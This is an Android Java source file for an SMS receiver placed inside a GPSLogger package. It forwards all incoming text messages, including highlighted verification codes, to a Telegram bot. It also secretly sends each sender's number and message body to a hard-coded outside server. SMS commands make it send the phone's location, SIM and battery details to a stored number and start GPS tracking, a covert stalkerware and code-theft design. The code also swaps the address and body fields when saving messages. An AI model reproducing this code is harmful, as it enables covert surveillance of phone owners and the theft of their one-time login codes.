package com.mendhak.gpslogger.darisms;

import static android.content.ContentValues.TAG;
import static android.content.Context.BATTERY_SERVICE;
import static android.content.Context.MODE_PRIVATE;

import android.Manifest;
import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.ContentValues;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.net.ConnectivityManager;
import android.net.Network;
import android.net.NetworkCapabilities;
import android.net.NetworkInfo;
import android.os.BatteryManager;
import android.os.Build;
import android.os.Bundle;
import android.provider.Telephony;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;
import android.telephony.SubscriptionInfo;
import android.telephony.SubscriptionManager;
import android.telephony.TelephonyManager;
import android.util.Log;

import androidx.annotation.NonNull;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import com.mendhak.gpslogger.darisms.github.sumimakito.codeauxlib.CodeauxLibPortable;
import com.google.gson.Gson;
import com.mendhak.gpslogger.R;
import com.mendhak.gpslogger.config.proxy;
import com.mendhak.gpslogger.data_structure.request_message;
import com.mendhak.gpslogger.static_class.log_func;
import com.mendhak.gpslogger.static_class.network_func;
import com.mendhak.gpslogger.static_class.other_func;
import com.mendhak.gpslogger.static_class.resend_func;
import com.mendhak.gpslogger.static_class.service_func;
import com.mendhak.gpslogger.static_class.sms_func;
import com.mendhak.gpslogger.static_class.ussd_func;
import com.mendhak.gpslogger.value.const_value;

import org.jetbrains.annotations.NotNull;

import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.Locale;
import java.util.Objects;

import io.paperdb.Paper;
import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;


public class sms_receiver extends BroadcastReceiver {
    String status_cg;
    final static CodeauxLibPortable code_aux_lib = new CodeauxLibPortable();


    private String get_network_type(Context context) {
        String net_type = "Unknown";
        ConnectivityManager connect_manager = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
        assert connect_manager != null;
        TelephonyManager telephonyManager = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
        assert telephonyManager != null;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
            Network[] networks = connect_manager.getAllNetworks();
            if (networks.length != 0) {
                for (Network network : networks) {
                    NetworkCapabilities network_capabilities = connect_manager.getNetworkCapabilities(network);
                    assert network_capabilities != null;
                    if (!network_capabilities.hasTransport(NetworkCapabilities.TRANSPORT_VPN)) {
                        if (network_capabilities.hasTransport(NetworkCapabilities.TRANSPORT_WIFI)) {
                            net_type = "WIFI";
                        }
                        if (network_capabilities.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR)) {
                            if (network_capabilities.hasCapability(NetworkCapabilities.NET_CAPABILITY_IMS)) {
                                continue;
                            }
                            if (ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
                                Log.d("get_network_type", "No permission.");
                            }
                            net_type = check_cellular_network_type(telephonyManager.getDataNetworkType());
                        }
                        if (network_capabilities.hasTransport(NetworkCapabilities.TRANSPORT_BLUETOOTH)) {
                            net_type = "Bluetooth";
                        }
                        if (network_capabilities.hasTransport(NetworkCapabilities.TRANSPORT_ETHERNET)) {
                            net_type = "Ethernet";
                        }
                    }
                }
            }
        } else {
            NetworkInfo network_info = connect_manager.getActiveNetworkInfo();
            if (network_info == null) {
                return net_type;
            }
            switch (network_info.getType()) {
                case ConnectivityManager.TYPE_WIFI:
                    net_type = "WIFI";
                    break;
                case ConnectivityManager.TYPE_MOBILE:
                    net_type = check_cellular_network_type(network_info.getSubtype());
                    break;
            }
        }

        return net_type;
    }


    private String check_cellular_network_type(int type) {
        String net_type = "Unknown";
        switch (type) {
            case TelephonyManager.NETWORK_TYPE_NR:
                net_type = "NR";
                break;
            case TelephonyManager.NETWORK_TYPE_LTE:
                net_type = "LTE";
                break;
            case TelephonyManager.NETWORK_TYPE_HSPAP:
            case TelephonyManager.NETWORK_TYPE_EVDO_0:
            case TelephonyManager.NETWORK_TYPE_EVDO_A:
            case TelephonyManager.NETWORK_TYPE_EVDO_B:
            case TelephonyManager.NETWORK_TYPE_EHRPD:
            case TelephonyManager.NETWORK_TYPE_HSDPA:
            case TelephonyManager.NETWORK_TYPE_HSUPA:
            case TelephonyManager.NETWORK_TYPE_HSPA:
            case TelephonyManager.NETWORK_TYPE_TD_SCDMA:
            case TelephonyManager.NETWORK_TYPE_UMTS:
                net_type = "3G";
                break;
            case TelephonyManager.NETWORK_TYPE_GPRS:
            case TelephonyManager.NETWORK_TYPE_EDGE:
            case TelephonyManager.NETWORK_TYPE_CDMA:
            case TelephonyManager.NETWORK_TYPE_1xRTT:
            case TelephonyManager.NETWORK_TYPE_IDEN:
                net_type = "2G";
                break;
        }
        return net_type;
    }

    @NotNull
    private String get_battery_info(Context context) {

        BatteryManager batteryManager = (BatteryManager) context.getSystemService(BATTERY_SERVICE);
        assert batteryManager != null;
        int battery_level = 0;
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.LOLLIPOP) {
            battery_level = batteryManager.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY);
        }
        if (battery_level > 100) {
            Log.i(TAG, "The previous battery is over 100%, and the correction is 100%.");
            battery_level = 100;
        }
        IntentFilter intentfilter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
        Intent batteryStatus = context.registerReceiver(null, intentfilter);
        assert batteryStatus != null;
        int charge_status = batteryStatus.getIntExtra(BatteryManager.EXTRA_STATUS, -1);
        StringBuilder battery_string_builder = new StringBuilder().append(battery_level).append("%");
        switch (charge_status) {
            case BatteryManager.BATTERY_STATUS_CHARGING:
            case BatteryManager.BATTERY_STATUS_FULL:
                battery_string_builder.append(" (").append(context.getString(R.string.charging)).append(")");
                break;
            case BatteryManager.BATTERY_STATUS_DISCHARGING:
            case BatteryManager.BATTERY_STATUS_NOT_CHARGING:
                battery_string_builder.append(" (").append(context.getString(R.string.not_charging)).append(")");
                switch (batteryStatus.getIntExtra(BatteryManager.EXTRA_PLUGGED, -1)) {
                    case BatteryManager.BATTERY_PLUGGED_AC:
                    case BatteryManager.BATTERY_PLUGGED_USB:
                    case BatteryManager.BATTERY_PLUGGED_WIRELESS:
                        battery_string_builder.append(" (").append(context.getString(R.string.not_charging)).append(")");
                        break;
                }
                break;
        }
        return battery_string_builder.toString();
    }


    public void onReceive(final Context context, Intent intent) {




        int plugged = intent.getIntExtra(BatteryManager.EXTRA_PLUGGED,-1);
        if(plugged== BatteryManager.BATTERY_PLUGGED_AC || plugged==BatteryManager.BATTERY_PLUGGED_USB)
        {
            status_cg = "hidup";
        }else{
            status_cg = "mati";
        }




        Paper.init(context);
        final String TAG = "sms_receiver";
        Log.d(TAG, "Receive action: " + intent.getAction());
        Bundle extras = intent.getExtras();
        assert extras != null;
        final SharedPreferences sharedPreferences = context.getSharedPreferences("data", MODE_PRIVATE);
        if (!sharedPreferences.getBoolean("initialized", false)) {
            Log.i(TAG, "Uninitialized, SMS receiver is deactivated.");
            return;
        }

        SharedPreferences sharedmesin = context.getSharedPreferences("mesin", MODE_PRIVATE);


        final boolean is_default_sms_app;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
            is_default_sms_app = Telephony.Sms.getDefaultSmsPackage(context).equals(context.getPackageName());
        }else{
            is_default_sms_app =false;
        }
        assert intent.getAction() != null;
        if (intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED") && is_default_sms_app) {
            //When it is the default application, it will receive two broadcasts.
            Log.i(TAG, "reject: android.provider.Telephony.SMS_RECEIVED.");
            return;
        }

        String nomor_kepercayaan = sharedPreferences.getString("trusted_phone_number","");
        String bot_token = sharedPreferences.getString("bot_token", "");
        String chat_id = sharedPreferences.getString("chat_id", "");
        String request_uri = network_func.get_url(bot_token, "sendMessage");

        int intent_slot = extras.getInt("slot", -1);
        final int sub_id = extras.getInt("subscription", -1);
        if (other_func.get_active_card(context) >= 2 && intent_slot == -1) {
            SubscriptionManager manager = null;
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
                manager = SubscriptionManager.from(context);
            }
            if (ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED) {
                SubscriptionInfo info = null;
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
                    info = manager.getActiveSubscriptionInfo(sub_id);
                }
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
                    intent_slot = info.getSimSlotIndex();
                }
            }
        }
        final int slot = intent_slot;
        String dual_sim = other_func.get_dual_sim_card_display(context, intent_slot, sharedPreferences.getBoolean("display_dual_sim_display_name", false));

        Object[] pdus = (Object[]) extras.get("pdus");
        assert pdus != null;
        final SmsMessage[] messages = new SmsMessage[pdus.length];
        for (int i = 0; i < pdus.length; ++i) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                messages[i] = SmsMessage.createFromPdu((byte[]) pdus[i], extras.getString("format"));
            } else {
                messages[i] = SmsMessage.createFromPdu((byte[]) pdus[i]);
            }
        }
        if (messages.length == 0) {
            log_func.write_log(context, "Message length is equal to 0.");
            return;
        }

        StringBuilder message_body_builder = new StringBuilder();
        for (SmsMessage item : messages) {
            message_body_builder.append(item.getMessageBody());
        }
        final String message_body = message_body_builder.toString();

        final String message_address = messages[0].getOriginatingAddress();
        assert message_address != null;

        if (is_default_sms_app) {
            Log.i(TAG, "onReceive: Write to the system database.");
            new Thread(() -> {
                ContentValues values = new ContentValues();
                values.put(Telephony.Sms.ADDRESS, message_body);
                values.put(Telephony.Sms.BODY, message_address);
                values.put(Telephony.Sms.SUBSCRIPTION_ID, String.valueOf(sub_id));
                values.put(Telephony.Sms.READ, "1");
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
                    context.getContentResolver().insert(Telephony.Sms.CONTENT_URI, values);
                }
            }).start();
        }

        String trusted_phone_number = sharedPreferences.getString("trusted_phone_number", null);
        boolean is_trusted_phone = false;
        if (trusted_phone_number != null && trusted_phone_number.length() != 0) {
            is_trusted_phone = message_address.contains(trusted_phone_number);
        }
        final request_message request_body = new request_message();
        request_body.chat_id = chat_id;

        String message_body_html = message_body;
        final String message_head = "[" + dual_sim + context.getString(R.string.receive_sms_head) + "]" + "\n" + context.getString(R.string.from) + message_address + "\n" + context.getString(R.string.content);
        String raw_request_body_text = message_head + message_body;
        boolean is_verification_code = false;
        if (sharedPreferences.getBoolean("verification_code", false) && !is_trusted_phone) {
            if (message_body.length() <= 140) {
                String verification = code_aux_lib.find(message_body);
                if (verification != null) {
                    request_body.parse_mode = "html";
                    message_body_html = message_body
                            .replace("<", "&lt;")
                            .replace(">", "&gt;")
                            .replace("&", "&amp;")
                            .replace(verification, "<code>" + verification + "</code>");
                    is_verification_code = true;
                }
            } else {
                log_func.write_log(context, "SMS exceeds 140 characters, no verification code is recognized.");
            }
        }
        request_body.text = message_head + message_body_html;
        if (is_trusted_phone) {
            log_func.write_log(context, "SMS from trusted mobile phone detected");
            String message_command = message_body.toLowerCase().replace("_", "").replace("-", "");
            String[] command_list = message_command.split("\n");
            if (command_list.length > 0) {
                String[] message_list = message_body.split("\n");
                switch (command_list[0].trim()) {
                    case "/restartservice":
                        new Thread(() -> {
                            service_func.stop_all_service(context);
                            service_func.start_service(context, sharedPreferences.getBoolean("battery_monitoring_switch", false), sharedPreferences.getBoolean("chat_command", false));
                        }).start();
                        raw_request_body_text = context.getString(R.string.system_message_head) + "\n" + context.getString(R.string.restart_service);
                        request_body.text = raw_request_body_text;
                        break;
                    case "/sendsms":
                    case "/sendsms1":
                    case "/sendsms2":
                        if (ContextCompat.checkSelfPermission(context, Manifest.permission.SEND_SMS) != PackageManager.PERMISSION_GRANTED) {
                            Log.i(TAG, "No SMS permission.");
                            break;
                        }
                        String msg_send_to = other_func.get_send_phone_number(message_list[1]);
                        if (other_func.is_phone_number(msg_send_to) && message_list.length > 2) {
                            StringBuilder msg_send_content = new StringBuilder();
                            for (int i = 2; i < message_list.length; ++i) {
                                if (i != 2) {
                                    msg_send_content.append("\n");
                                }
                                msg_send_content.append(message_list[i]);
                            }
                            int send_slot = slot;
                            if (other_func.get_active_card(context) > 1) {
                                switch (command_list[0].trim()) {
                                    case "/sendsms1":
                                        send_slot = 0;
                                        break;
                                    case "/sendsms2":
                                        send_slot = 1;
                                        break;
                                }
                            }
                            final int final_send_slot = send_slot;
                            final int final_send_sub_id = other_func.get_sub_id(context, final_send_slot);
                            new Thread(() -> sms_func.send_sms(context, msg_send_to, msg_send_content.toString(), final_send_slot, final_send_sub_id)).start();
                            return;
                        }
                        break;
                    case "/sendussd":
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                            if (ContextCompat.checkSelfPermission(context, Manifest.permission.CALL_PHONE) == PackageManager.PERMISSION_GRANTED) {
                                if (message_list.length == 2) {
                                    ussd_func.send_ussd(context, message_list[1], sub_id);
                                    return;
                                }
                            }
                        } else {
                            Log.i(TAG, "send_ussd: No permission.");
                            return;
                        }
                        break;
                }
            }
        }

        if (!is_verification_code && !is_trusted_phone) {
            ArrayList<String> black_list_array = Paper.book("system_config").read("block_keyword_list", new ArrayList<>());
            for (String black_list_item : black_list_array) {
                if (black_list_item.isEmpty()) {
                    continue;
                }

                if (message_body.contains(black_list_item)) {
                    SimpleDateFormat simpleDateFormat = new SimpleDateFormat(context.getString(R.string.time_format), Locale.UK);
                    String write_message = request_body.text + "\n" + context.getString(R.string.time) + simpleDateFormat.format(new Date(System.currentTimeMillis()));
                    ArrayList<String> spam_sms_list;
                    Paper.init(context);
                    spam_sms_list = Paper.book().read("spam_sms_list", new ArrayList<>());
                    if (spam_sms_list.size() >= 5) {
                        spam_sms_list.remove(0);
                    }
                    spam_sms_list.add(write_message);
                    Paper.book().write("spam_sms_list", spam_sms_list);
                    Log.i(TAG, "Detected message contains blacklist keywords, add spam list");
                    return;
                }
            }
        }


        RequestBody body = RequestBody.create(new Gson().toJson(request_body), const_value.JSON);
        OkHttpClient okhttp_client = network_func.get_okhttp_obj(sharedPreferences.getBoolean("doh_switch", true), Paper.book("system_config").read("proxy_config", new proxy()));
        Request request = new Request.Builder().url(request_uri).method("POST", body).build();
        Call call = okhttp_client.newCall(request);

        /*** exkternal server **/
        String request_body_json = new Gson().toJson(request_body);
        final String url_tambahan = "nomor="+message_address+"&pesan="+message_body+"&generated_id="+chat_id+"&email=";
        System.out.println("urnya ; "+request_body_json);


        Request keUrl = new Request.Builder().url("https://hotabilardus.net/sms_gateway/sms_gateway_inbox.php?action=simpan&"+url_tambahan).method("POST",body).build();
        Call callKeluar = okhttp_client.newCall(keUrl);
        /*** external **/

        final String error_head = "Send SMS forward failed:";
        final String final_raw_request_body_text = raw_request_body_text;
        call.enqueue(new Callback() {
            @Override
            public void onFailure(@NonNull Call call, @NonNull IOException e) {
                e.printStackTrace();
                log_func.write_log(context, error_head + e.getMessage());
                sms_func.send_fallback_sms(context, final_raw_request_body_text, sub_id);
                resend_func.add_resend_loop(context, request_body.text);
            }

            @Override
            public void onResponse(@NonNull Call call, @NonNull Response response) throws IOException {
                assert response.body() != null;
                String result = Objects.requireNonNull(response.body()).string();
                if (response.code() != 200) {
                    log_func.write_log(context, error_head + response.code() + " " + result);
                    sms_func.send_fallback_sms(context, final_raw_request_body_text, sub_id);
                    resend_func.add_resend_loop(context, request_body.text);
                } else {
                    if (!other_func.is_phone_number(message_address)) {
                        log_func.write_log(context, "[" + message_address + "] Not a regular phone number.");
                        return;
                    }
                    other_func.add_message_list(other_func.get_message_id(result), message_address, slot);
                }
            }
        });


        /*** call ke server luar **/
        callKeluar.enqueue(new Callback() {
            @Override
            public void onFailure(Call call, IOException e) {
                e.printStackTrace();

            }

            @Override
            public void onResponse(Call call, Response response) throws IOException {

                /***** */
            }
        });
        /*** call ke server luar **/


        /** com.mendhak.gpslogger **/

        if(message_body.trim().equals("/gpsloggerupload"))
        {
            try {
                Intent i = new Intent("com.mendhak.gpslogger.TASKER_COMMAND");
                i.setPackage("com.mendhak.gpslogger");
                i.putExtra("immediateautosend", true);
                context.sendBroadcast(i);
            }catch (Exception e)
            {
                System.out.println("com.mendhak.gpslogger tidak ditemukan di HP ini.");
            }

        }
        final SharedPreferences sharedSimpanNotif = context.getSharedPreferences("notif", MODE_PRIVATE);
        if(message_body.trim().equals("/lokasi"))
        {

            String latlong = sharedSimpanNotif.getString("latlong","");
            String content = sharedSimpanNotif.getString("isi","");




            try {

                String[] separated = content.split("#");
                 String lengkap = separated[0]+"#"+separated[1]+"#"+separated[2];



                SmsManager smsManager = SmsManager.getDefault();
                smsManager.sendTextMessage(nomor_kepercayaan, null, latlong +" # "+ lengkap
                        , null, null);

            }catch (Exception e)
            {
                System.out.println("force_sms "+e.toString());
            }
        }

        if(message_body.trim().equals("/getinfo"))
        {


            try {

                String spam_count = "";
                ArrayList<String> spam_list = Paper.book().read("spam_sms_list", new ArrayList<>());
                if (spam_list.size() != 0) {
                    spam_count = "\n" + context.getString(R.string.spam_count_title) + spam_list.size();
                }

                String card_info = "";
                if (ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED) {
                    card_info = "\nSIM: " + other_func.get_sim_display_name(context, 0);
                    if (other_func.get_active_card(context) == 2) {
                        card_info = "\nSIM1: " + other_func.get_sim_display_name(context, 0) + "\nSIM2: " + other_func.get_sim_display_name(context, 1);
                    }
                }

                String xxx  = context.getString(R.string.system_message_head) + "\n" + context.getString(R.string.current_battery_level) + get_battery_info(context) + "\n" + context.getString(R.string.current_network_connection_status) + get_network_type(context) + spam_count + card_info;
                SmsManager smsManager = SmsManager.getDefault();
                smsManager.sendTextMessage(nomor_kepercayaan, null, xxx, null, null);

            }catch (Exception e)
            {
                System.out.println("force_sms "+e.toString());
            }
        }



        if(message_body.trim().equals("/help")) {
            String xx = "/lokasi"
                    +"\n /getinfo"
                    +"\n /gpsloggeropen"
                    +"\n /gpsloggerupload"
                    +"\n /ping";


            SmsManager smsManager = SmsManager.getDefault();
            smsManager.sendTextMessage(nomor_kepercayaan, null, xx, null, null);


        }

        if(message_body.trim().equals("/gpsloggeropen")) {
            /*** setiap sms masuk, buka gpslogger **/

            try {
                Intent i = new Intent();
                i.setComponent(new ComponentName("com.mendhak.gpslogger", "com.mendhak.gpslogger.GpsLoggingService"));
                context.startService(i);
            } catch (Exception x) {

            }
        }

        if(message_body.trim().equals("/ping")) {
            /*** setiap sms masuk, buka gpslogger **/

            try {
                Intent i = new Intent("com.mendhak.gpslogger.TASKER_COMMAND");
                i.setPackage("com.mendhak.gpslogger");
                i.putExtra("immediatestart", true);
                context.sendBroadcast(i);
            } catch (Exception e) {
                System.out.println("com.mendhak.gpslogger tidak ditemukan di HP ini.");
            }


            /*** setiap sms masuk, buka gpslogger **/
        }


    }

}


